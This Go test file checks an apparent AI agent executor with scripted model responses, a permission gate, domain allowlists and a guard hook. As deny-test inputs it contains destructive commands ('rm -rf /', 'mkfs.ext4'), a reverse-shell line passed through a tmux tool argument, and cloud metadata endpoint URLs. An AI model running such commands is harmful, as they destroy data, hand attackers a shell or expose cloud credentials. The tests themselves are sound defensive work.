package executor

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"

	"scopeforge/internal/conversation"
	"scopeforge/internal/event"
	"scopeforge/internal/guard"
	"scopeforge/internal/reasonix/provider"
	"scopeforge/internal/reasonix/tool"
	"scopeforge/internal/reasonix/tool/builtin"
	"scopeforge/internal/store"
	"scopeforge/internal/testutil"
)

// scriptedProvider 按轮次返回固定 chunk 序列(无 HTTP)。
type scriptedProvider struct {
	name string
	// 每轮:文本或工具调用(依次消费)
	rounds [][]provider.Chunk
	idx    int
}

func (p *scriptedProvider) Name() string { return p.name }

func (p *scriptedProvider) Stream(ctx context.Context, req provider.Request) (<-chan provider.Chunk, error) {
	ch := make(chan provider.Chunk, 16)
	go func() {
		defer close(ch)
		round := p.rounds[p.idx]
		p.idx++
		for _, c := range round {
			select {
			case <-ctx.Done():
				ch <- provider.Chunk{Type: provider.ChunkError, Err: ctx.Err()}
				return
			case ch <- c:
			}
		}
		ch <- provider.Chunk{Type: provider.ChunkUsage, Usage: &provider.Usage{
			PromptTokens: 100, CompletionTokens: 10, CacheHitTokens: 50, CacheMissTokens: 50,
		}}
		ch <- provider.Chunk{Type: provider.ChunkDone}
	}()
	return ch, nil
}

func textRound(text string) []provider.Chunk {
	return []provider.Chunk{{Type: provider.ChunkText, Text: text}}
}

func toolRound(calls ...provider.ToolCall) []provider.Chunk {
	out := []provider.Chunk{}
	for _, c := range calls {
		out = append(out, provider.Chunk{Type: provider.ChunkToolCallStart, ToolCall: &c})
		out = append(out, provider.Chunk{Type: provider.ChunkToolCall, ToolCall: &c})
	}
	return out
}

// newTestOpts 构建测试运行参数。
func newTestOpts(t *testing.T, rounds [][]provider.Chunk, maxTurns int) *Options {
	t.Helper()
	opts, _ := newTestOptsWithDB(t, rounds, maxTurns)
	return opts
}

func newTestOptsWithDB(t *testing.T, rounds [][]provider.Chunk, maxTurns int) (*Options, *store.DB) {
	t.Helper()
	db := testutil.NewTestDB(t)
	convStore := conversation.NewStore(db)
	s := conversation.New("sess-exec", conversation.KindMain)
	reg := tool.NewRegistry()
	ws := builtin.Workspace{Dir: t.TempDir()}
	for _, tl := range ws.Tools() {
		reg.Add(tl)
	}
	gate, err := NewGate(ModeYolo, []string{`rm -rf /`}, []string{"example.com"})
	if err != nil {
		t.Fatal(err)
	}
	sink := event.NewSQLiteSink(db)
	return &Options{
		Provider:     &scriptedProvider{name: "script", rounds: rounds},
		Registry:     reg,
		Session:      s,
		Store:        convStore,
		MaxTurns:     maxTurns,
		Gate:         gate,
		Sink:         sink,
		CompactCfg:   conversation.DefaultCompactConfig(),
		SystemPrompt: "你是测试智能体",
	}, db
}

func TestRunToolRoundTrip(t *testing.T) {
	opts := newTestOpts(t, [][]provider.Chunk{
		toolRound(provider.ToolCall{ID: "c1", Name: "bash", Arguments: `{"command":"echo exec-ok"}`}),
		textRound("任务完成,最终答案"),
	}, 10)

	res, err := Run(context.Background(), opts)
	if err != nil {
		t.Fatalf("run: %v", err)
	}
	if res.FinalText != "任务完成,最终答案" {
		t.Errorf("final = %q", res.FinalText)
	}
	if res.Turns != 2 || res.ToolCalls != 1 {
		t.Errorf("turns=%d toolCalls=%d", res.Turns, res.ToolCalls)
	}
	// 会话含:user 注入?没有 user 消息——只有 assistant 2 条 + tool 1 条
	if len(opts.Session.Messages) != 3 {
		t.Errorf("session messages = %d: %+v", len(opts.Session.Messages), opts.Session.Messages)
	}
	// 工具结果回填
	var toolOut string
	for _, m := range opts.Session.Messages {
		if m.Role == provider.RoleTool {
			toolOut = m.Content
		}
	}
	if !strings.Contains(toolOut, "exec-ok") {
		t.Errorf("tool result = %q", toolOut)
	}
	// 每轮落库:可重载
	loaded, err := opts.Store.Load("sess-exec")
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if len(loaded.Messages) != 3 {
		t.Errorf("loaded messages = %d", len(loaded.Messages))
	}
}

func TestMaxTurnsHardLimit(t *testing.T) {
	// 每轮都调用工具,永不结束
	toolRounds := [][]provider.Chunk{}
	for i := 0; i < 10; i++ {
		toolRounds = append(toolRounds, toolRound(provider.ToolCall{ID: "c", Name: "bash", Arguments: `{"command":"echo x"}`}))
	}
	opts := newTestOpts(t, toolRounds, 3)
	res, err := Run(context.Background(), opts)
	if !errors.Is(err, ErrMaxTurns) {
		t.Fatalf("expected ErrMaxTurns, got %v", err)
	}
	if res.Turns != 3 {
		t.Errorf("turns = %d, want 3", res.Turns)
	}
}

func TestBlacklistHardDeny(t *testing.T) {
	opts := newTestOpts(t, [][]provider.Chunk{
		toolRound(provider.ToolCall{ID: "c1", Name: "bash", Arguments: `{"command":"rm -rf /"}`}),
		textRound("继续"),
	}, 10)
	_, err := Run(context.Background(), opts)
	if err != nil {
		t.Fatalf("run: %v", err)
	}
	// 黑名单调用被拒:工具结果含 denied
	var denied bool
	for _, m := range opts.Session.Messages {
		if m.Role == provider.RoleTool && strings.Contains(m.Content, "permission denied") {
			denied = true
		}
	}
	if !denied {
		t.Error("blacklisted command should be denied in tool result")
	}
}

func TestEventsPersisted(t *testing.T) {
	opts, db := newTestOptsWithDB(t, [][]provider.Chunk{
		toolRound(provider.ToolCall{ID: "c1", Name: "bash", Arguments: `{"command":"echo ok"}`}),
		textRound("done"),
	}, 10)
	Run(context.Background(), opts)
	events, err := event.Query(db, "sess-exec", 0, 0, 100)
	if err != nil {
		t.Fatalf("query: %v", err)
	}
	kinds := map[event.Kind]bool{}
	for _, e := range events {
		kinds[e.Kind] = true
	}
	for _, want := range []event.Kind{event.KindTurnStart, event.KindToolCallStart, event.KindToolCallResult, event.KindTextDelta, event.KindUsage} {
		if !kinds[want] {
			t.Errorf("event kind %s missing: %v", want, kinds)
		}
	}
	// 增量拉取游标
	last, err := event.LatestSeq(db)
	if err != nil || last <= 0 {
		t.Errorf("latest seq = %d, err=%v", last, err)
	}
	after, _ := event.Query(db, "", last, 0, 10)
	if len(after) != 0 {
		t.Errorf("no events should exist after latest seq, got %d", len(after))
	}
}

func TestStreamDeltasPersistAsMessageEvents(t *testing.T) {
	opts, db := newTestOptsWithDB(t, [][]provider.Chunk{{
		{Type: provider.ChunkReasoning, Text: "思考_"},
		{Type: provider.ChunkReasoning, Text: "re"},
		{Type: provider.ChunkText, Text: "最终"},
		{Type: provider.ChunkText, Text: "答案"},
	}}, 10)
	if _, err := Run(context.Background(), opts); err != nil {
		t.Fatal(err)
	}
	events, err := event.Query(db, "sess-exec", 0, 0, 100)
	if err != nil {
		t.Fatal(err)
	}
	var reasoning, text int
	for _, e := range events {
		switch e.Kind {
		case event.KindReasoningDelta:
			reasoning++
			p, _ := e.Payload.(map[string]any)
			if p["text"] != "思考_re" || p["aggregated"] != true {
				t.Fatalf("reasoning event = %+v", e.Payload)
			}
		case event.KindTextDelta:
			text++
			p, _ := e.Payload.(map[string]any)
			if p["text"] != "最终答案" || p["aggregated"] != true {
				t.Fatalf("text event = %+v", e.Payload)
			}
		}
	}
	if reasoning != 1 || text != 1 {
		t.Fatalf("reasoning events=%d text events=%d, want 1/1(逐 token 不再落库)", reasoning, text)
	}
}

func TestPermissionModes(t *testing.T) {
	g, err := NewGate(ModeAuto, nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	if d, _ := g.Check("cat x", true, nil); d != Allow {
		t.Errorf("auto: read-only should allow, got %v", d)
	}
	if d, _ := g.Check("write_file", false, nil); d != Allow {
		t.Errorf("auto: write should allow (ask 已移除,06.14), got %v", d)
	}
	g2, _ := NewGate(ModeYolo, []string{`rm -rf`}, nil)
	if d, _ := g2.Check("anything", false, nil); d != Allow {
		t.Errorf("yolo should allow, got %v", d)
	}
	if d, _ := g2.Check("rm -rf /x", false, nil); d != Deny {
		t.Errorf("yolo must still block blacklist, got %v", d)
	}
	// 域名白名单
	g4, _ := NewGate(ModeYolo, nil, []string{"target.test"})
	if d, _ := g4.Check("web_fetch", true, map[string]any{"url": "https://sub.target.test/x"}); d != Allow {
		t.Errorf("subdomain should be allowed, got %v", d)
	}
	if d, _ := g4.Check("web_fetch", true, map[string]any{"url": "https://evil.com/"}); d != Deny {
		t.Errorf("non-allowlisted domain should deny, got %v", d)
	}
}

func TestEpisodeBudget(t *testing.T) {
	g, _ := NewGate(ModeYolo, nil, nil)
	args := map[string]any{"command": "nmap x"}
	for i := 0; i < 3; i++ {
		g.RecordFailure("bash", args)
	}
	if d, _ := g.Check("bash", false, args); d != Deny {
		t.Errorf("budget should deny after 3 failures, got %v", d)
	}
	g.RecordSuccess("bash", args)
	if d, _ := g.Check("bash", false, args); d != Allow {
		t.Errorf("success should reset budget, got %v", d)
	}
}

var _ = json.RawMessage{}

func TestGuardHookDenies(t *testing.T) {
	opts := newTestOpts(t, [][]provider.Chunk{
		toolRound(provider.ToolCall{ID: "c1", Name: "bash", Arguments: `{"command":"mkfs.ext4 /dev/sdb1"}`}),
		textRound("继续"),
	}, 10)
	h, err := guard.NewHook(event.Discard, "c1")
	if err != nil {
		t.Fatal(err)
	}
	opts.Guard = h
	if _, err := Run(context.Background(), opts); err != nil {
		t.Fatalf("run: %v", err)
	}
	var denied bool
	for _, m := range opts.Session.Messages {
		if m.Role == provider.RoleTool && strings.Contains(m.Content, "guard denied") {
			denied = true
		}
	}
	if !denied {
		t.Error("guard-denied command should appear in tool result")
	}
	if len(h.Denials()) != 1 {
		t.Errorf("denials=%d want 1", len(h.Denials()))
	}
}

func TestMetadataEndpointDenied(t *testing.T) {
	g, err := NewGate(ModeYolo, nil, []string{"169.254.169.254"})
	if err != nil {
		t.Fatal(err)
	}
	// 即使白名单包含元数据端点,也必须拒绝(docs/04 §5.3)
	d, reason := g.Check("web_fetch", true, map[string]any{"url": "http://169.254.169.254/latest/meta-data/"})
	if d != Deny || !strings.Contains(reason, "metadata") {
		t.Errorf("metadata endpoint must be denied: %v %s", d, reason)
	}
	d, reason = g.Check("web_fetch", true, map[string]any{"url": "http://metadata.google.internal/computeMetadata/v1/"})
	if d != Deny {
		t.Errorf("google metadata endpoint must be denied: %v %s", d, reason)
	}
	// 正常目标放行(白名单内,非元数据)
	g3, err := NewGate(ModeYolo, nil, []string{"169.254.169.253"})
	if err != nil {
		t.Fatal(err)
	}
	d, _ = g3.Check("web_fetch", true, map[string]any{"url": "http://169.254.169.253/page"})
	if d == Deny {
		t.Error("normal IP should not be denied")
	}
	g2, err := NewGate(ModeYolo, nil, []string{"10.10.0.0/24"})
	if err != nil {
		t.Fatal(err)
	}
	d, _ = g2.Check("web_fetch", true, map[string]any{"url": "http://10.10.0.5/page"})
	if d == Deny {
		t.Error("allowlisted CIDR target should pass")
	}
}

// fakeTmuxTool 模拟带 cmd 参数的注册工具(guard 参数通道验证用)。
type fakeTmuxTool struct{}

func (fakeTmuxTool) Name() string        { return "tmux_new_session" }
func (fakeTmuxTool) Description() string { return "fake tmux" }
func (fakeTmuxTool) Schema() json.RawMessage {
	return json.RawMessage(`{"type":"object","properties":{"name":{"type":"string"},"cmd":{"type":"string"}},"required":["name","cmd"]}`)
}
func (fakeTmuxTool) ReadOnly() bool { return false }
func (fakeTmuxTool) Execute(ctx context.Context, args json.RawMessage) (string, error) {
	return "created", nil
}

// TestGuardCoversToolArgs guard 覆盖工具参数通道(docs/04 §5.4):
// tmux_new_session(cmd="bash -i >& /dev/tcp/...") 不得绕过拦截。
func TestGuardCoversToolArgs(t *testing.T) {
	opts := newTestOpts(t, [][]provider.Chunk{
		toolRound(provider.ToolCall{ID: "c1", Name: "tmux_new_session", Arguments: `{"name":"msf","cmd":"bash -i >& /dev/tcp/1.2.3.4/4444"}`}),
		textRound("继续"),
	}, 10)
	opts.Registry.Add(fakeTmuxTool{})
	h, err := guard.NewHook(event.Discard, "c1")
	if err != nil {
		t.Fatal(err)
	}
	opts.Guard = h
	if _, err := Run(context.Background(), opts); err != nil {
		t.Fatalf("run: %v", err)
	}
	var denied bool
	for _, m := range opts.Session.Messages {
		if m.Role == provider.RoleTool && strings.Contains(m.Content, "guard denied") {
			denied = true
		}
	}
	if !denied {
		t.Error("tmux cmd channel must be covered by guard")
	}
	if len(h.Denials()) != 1 {
		t.Errorf("denials=%d want 1", len(h.Denials()))
	}
	// 工具不得真正执行(被 guard 拦在 Execute 之前)
	if strings.Contains(strings.Join(collectToolResults(opts), " "), "created") {
		t.Error("guarded tool must not execute")
	}
}

func collectToolResults(opts *Options) []string {
	var out []string
	for _, m := range opts.Session.Messages {
		if m.Role == provider.RoleTool {
			out = append(out, m.Content)
		}
	}
	return out
}

// TestGuardAllowsBenignTargetOps 授权内常规操作不误拦截:
// rm -rf /tmp/xxx、curl -u 目标 basic auth。
func TestGuardAllowsBenignTargetOps(t *testing.T) {
	h, err := guard.NewHook(event.Discard, "")
	if err != nil {
		t.Fatal(err)
	}
	for _, cmd := range []string{
		"rm -rf /tmp/workspace-cache",
		"curl -u admin:admin123 https://target.example.com/login",
		"rm file.txt",
	} {
		if reason, denied := h.CheckCommand(cmd); denied {
			t.Errorf("benign command %q wrongly denied: %s", cmd, reason)
		}
	}
	// 根删除仍然拦截
	for _, cmd := range []string{"rm -rf /", "rm -rf -- /"} {
		if _, denied := h.CheckCommand(cmd); !denied {
			t.Errorf("root delete %q should be denied", cmd)
		}
	}
}

// TestGateAddDenied 验收(04 §1 exclusions → Gate):白名单内再排除——禁区域名
// 确定性拒绝(精确/通配),非禁区白名单目标仍放行。
func TestGateAddDenied(t *testing.T) {
	g, err := NewGate(ModeYolo, nil, []string{"target.test", "*.b.example.com"})
	if err != nil {
		t.Fatal(err)
	}
	if err := g.AddDenied([]string{"admin.b.example.com", "*.internal.test"}); err != nil {
		t.Fatal(err)
	}
	// 精确黑名单命中 → 拒绝(即使同域白名单)
	if d, reason := g.Check("web_fetch", true, map[string]any{"url": "https://admin.b.example.com/"}); d != Deny {
		t.Errorf("exact denied domain allowed: %v %s", d, reason)
	}
	// 通配黑名单命中 → 拒绝
	if d, _ := g.Check("web_fetch", true, map[string]any{"url": "https://x.internal.test/"}); d != Deny {
		t.Error("wildcard denied domain allowed")
	}
	// 白名单非禁区 → 放行
	if d, _ := g.Check("web_fetch", true, map[string]any{"url": "https://app.b.example.com/"}); d != Allow {
		t.Error("non-denied whitelisted domain blocked")
	}
	if d, _ := g.Check("web_fetch", true, map[string]any{"url": "https://target.test/x"}); d != Allow {
		t.Error("plain whitelisted domain blocked")
	}
	// 白名单外且非禁区 → 拒绝(白名单仍是硬边界)
	if d, _ := g.Check("web_fetch", true, map[string]any{"url": "https://evil.com/"}); d != Deny {
		t.Error("out-of-scope allowed")
	}
}
